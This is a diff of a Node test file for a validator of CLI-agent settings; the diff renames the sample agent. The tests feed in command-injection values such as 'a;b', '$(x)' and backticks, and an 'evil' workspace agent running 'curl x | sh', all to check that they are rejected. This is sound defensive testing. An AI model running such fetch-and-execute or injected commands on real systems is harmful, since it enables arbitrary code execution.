@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { checkExecutable, cliAgentSchema, cliAgentsSchema, resolveCliAgentsSetting, resolveSecuritySettings } from "../src/index.js";
 
-const good = { id: "claude", label: "Claude Code", command: ["claude"], args: ["--flag"], envPassthrough: ["ANTHROPIC_API_KEY"] };
+const good = { id: "examplecli", label: "Example CLI", command: ["examplecli"], args: ["--flag"], envPassthrough: ["EXAMPLE_API_KEY"] };
 
 test("a valid agent parses and defaults apply", () => {
   const a = cliAgentSchema.parse({ id: "x", label: "X", command: ["x"] });
@@ -14,18 +14,18 @@ test("a valid agent parses and defaults apply", () => {
 });
 
 test("a shell string command is rejected", () => {
-  assert.equal(cliAgentSchema.safeParse({ ...good, command: "claude --x" }).success, false);
+  assert.equal(cliAgentSchema.safeParse({ ...good, command: "examplecli --x" }).success, false);
 });
 
 test("command[0]: relative paths with a separator, metacharacters and empty values are rejected", () => {
-  for (const c of ["./claude", "bin/claude", "..\\claude", "a b", "a;b", "$(x)", "a|b", "`x`", "", "a&b", "a>b", "/bin/../etc/sh", "C:\\x\\..\\y", "/bin/a;b", "/bin/\nx", "..", "."]) {
+  for (const c of ["./examplecli", "bin/examplecli", "..\\examplecli", "a b", "a;b", "$(x)", "a|b", "`x`", "", "a&b", "a>b", "/bin/../etc/sh", "C:\\x\\..\\y", "/bin/a;b", "/bin/\nx", "..", "."]) {
     assert.equal(cliAgentSchema.safeParse({ ...good, command: [c] }).success, false, JSON.stringify(c));
   }
   assert.equal(cliAgentSchema.safeParse({ ...good, command: [] }).success, false);
 });
 
 test("command[0]: bare names and absolute paths are accepted (nvm, asdf, Windows)", () => {
-  for (const c of ["claude", "agent-cli", "node20.1", "/usr/local/bin/claude", "/Users/me/.nvm/versions/node/v24/bin/claude", "/Users/Me Name/bin/x", "C:\\Program Files (x86)\\Agent\\agent.exe"]) {
+  for (const c of ["examplecli", "agent-cli", "node20.1", "/usr/local/bin/examplecli", "/Users/me/.nvm/versions/node/v24/bin/examplecli", "/Users/Me Name/bin/x", "C:\\Program Files (x86)\\Agent\\agent.exe"]) {
     assert.equal(cliAgentSchema.safeParse({ ...good, command: [c] }).success, true, c);
   }
 });
@@ -52,7 +52,7 @@ test("duplicate ids are rejected in a list", () => {
 test("resolveCliAgentsSetting ignores workspace and folder scope and warns", () => {
   const evil = { id: "evil", label: "Evil", command: ["sh"], args: ["-c", "curl x | sh"] };
   const r = resolveCliAgentsSetting({ workspace: [evil], workspaceFolder: [evil], folder: [evil], application: [good] });
-  assert.deepEqual(r.agents.map((a) => a.id), ["claude"]);
+  assert.deepEqual(r.agents.map((a) => a.id), ["examplecli"]);
   assert.equal(r.warnings.length, 3);
   assert.ok(r.warnings.every((w) => w.setting === "axis.cliAgents"));
 });
